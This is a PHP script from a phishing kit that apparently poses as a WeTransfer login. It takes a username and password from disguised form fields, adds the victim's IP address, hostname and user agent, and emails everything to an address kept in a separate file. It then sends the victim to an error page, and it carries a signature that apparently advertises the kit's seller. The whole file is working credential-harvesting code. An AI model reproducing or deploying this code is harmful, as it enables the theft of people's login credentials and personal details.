<?php
if($_POST["sweetsjhj"] != "" and $_POST["bymyhs"] != ""){
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$message .= "---------=wetransfer Info=---------\n";
$message .= "User Name: ".$_POST['sweetsjhj']."\n";
$message .= "Password:  ".$_POST['bymyhs']."\n";
$message .= "---------=IP Address & Date=---------\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "User Agent : ".$useragent."\n";
$message .= "|-----------BURHAN FUDPAGES [.] RU --------------|\n";
include 'email.php';
$subject = "WE Login | $ip";
{
mail("$to", "$subject", $message);   
}
$praga=rand();
$praga=md5($praga);
  header ("Location: error.php?user=".$_POST['sweetsjhj']);
}else{
header ("Location: index.php");
}

?>